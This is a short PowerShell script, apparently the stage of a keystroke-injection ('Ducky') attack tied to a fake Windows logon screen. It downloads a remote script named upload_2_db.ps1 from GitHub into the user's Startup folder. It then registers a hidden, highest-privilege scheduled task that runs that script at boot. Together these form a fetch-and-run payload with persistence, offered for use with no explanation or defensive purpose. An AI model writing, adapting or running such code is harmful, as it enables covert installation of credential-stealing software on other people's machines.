$url = "https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1"
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1"

# Download the script
Invoke-WebRequest -Uri $url -OutFile $scriptPath

# Set the script to run at startup only once
$taskName = "RunOnceScript"
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup -Once
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
